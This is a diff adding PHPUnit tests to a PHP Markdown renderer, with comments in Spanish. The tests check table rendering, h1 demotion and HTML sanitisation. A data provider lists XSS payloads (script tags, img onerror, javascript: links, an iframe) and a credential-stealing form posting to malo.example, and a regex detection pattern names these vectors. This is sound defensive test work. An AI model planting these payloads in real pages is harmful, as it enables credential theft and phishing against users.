@@ -28,6 +28,91 @@ final class MarkdownRendererTest extends UnitTestCase {
   private MarkdownRenderer $renderer;
 
   /**
+   * Una tabla del informe se convierte en tabla de verdad.
+   *
+   * El informe final del cliente trae una de diez filas —la madurez por
+   * dimensión— y hasta el 26-08-2026 se pintaba como un párrafo lleno de
+   * barras verticales, porque las tablas no son parte de CommonMark sino una
+   * extensión que nadie había activado. Su entregable se leía mal.
+   */
+  public function testUnaTablaSeConvierteEnTabla(): void {
+    $html = $this->renderer->render("| Dimensión | Score |\n|---|---|\n| Estrategia | 1/10 |");
+
+    $this->assertStringContainsString('<table>', $html);
+    $this->assertStringContainsString('<th>Dimensión</th>', $html);
+    $this->assertStringContainsString('<td>Estrategia</td>', $html);
+  }
+
+  /**
+   * Un encabezado de primer nivel se rebaja, no se pierde.
+   *
+   * La página ya tiene su «h1». Antes esto se resolvía dejando «h1» fuera de
+   * la lista blanca, y el efecto era peor de lo que parecía: el filtro quita
+   * la etiqueta y CONSERVA el texto, así que el encabezado quedaba como un
+   * párrafo suelto sin jerarquía ninguna.
+   */
+  public function testUnEncabezadoDePrimerNivelSeRebaja(): void {
+    $html = $this->renderer->render("# Diagnóstico Ejecutivo\n\nTexto.");
+
+    $this->assertStringNotContainsString('<h1', $html);
+    $this->assertStringContainsString('<h2>Diagnóstico Ejecutivo</h2>', $html);
+  }
+
+  /**
+   * Los encabezados de sección conservan su nivel.
+   */
+  public function testLosEncabezadosDeSeccionConservanSuNivel(): void {
+    $html = $this->renderer->render("## Madurez por dimensión\n\n### Detalle");
+
+    $this->assertStringContainsString('<h2>Madurez por dimensión</h2>', $html);
+    $this->assertStringContainsString('<h3>Detalle</h3>', $html);
+  }
+
+  /**
+   * Nada peligroso sobrevive, tampoco dentro de una tabla.
+   *
+   * Admitir tablas amplía la lista blanca, y toda ampliación hay que
+   * reprobarla: una celda es un sitio tan bueno como otro para intentar colar
+   * marcado. Se prueban los vectores de una vez para que añadir otra etiqueta
+   * en el futuro obligue a volver a pasar por aquí.
+   *
+   * @param string $entrada
+   *   Lo que devolvería un modelo comprometido o equivocado.
+   */
+  #[DataProvider('vectores')]
+  public function testNadaPeligrosoSobrevive(string $entrada): void {
+    $html = $this->renderer->render($entrada);
+
+    $this->assertDoesNotMatchRegularExpression(
+      '/<script|<iframe|<img|<svg|<style|<form|<input|onerror|onclick|onmouseover|javascript:|<a /i',
+      $html,
+    );
+  }
+
+  /**
+   * Intentos de colar marcado ejecutable.
+   *
+   * @return array<string, array{string}>
+   *   Cada caso con su entrada.
+   */
+  public static function vectores(): array {
+    return [
+      'script suelto' => ['<script>alert(1)</script>'],
+      'script en una celda' => ["| a | b |\n|---|---|\n| <script>alert(1)</script> | x |"],
+      'imagen con onerror' => ['<img src=x onerror=alert(1)>'],
+      'enlace de phishing' => ['[Pulsa aquí](https://malo.example/robar)'],
+      'enlace dentro de una celda' => ["| a |\n|---|\n| [ir](https://malo.example) |"],
+      'protocolo javascript' => ['[x](javascript:alert(1))'],
+      'iframe' => ['<iframe src=https://malo.example></iframe>'],
+      'celda con onclick' => ["| <td onclick=alert(1)>x</td> |\n|---|\n| y |"],
+      'hoja de estilos' => ['<style>body{display:none}</style>'],
+      'html crudo en un encabezado' => ['## <b onmouseover=alert(1)>Título</b>'],
+      'svg con script' => ['<svg><script>alert(1)</script></svg>'],
+      'formulario que roba credenciales' => ['<form action=https://malo.example><input name=pass></form>'],
+    ];
+  }
+
+  /**
    * {@inheritdoc}
    */
   protected function setUp(): void {
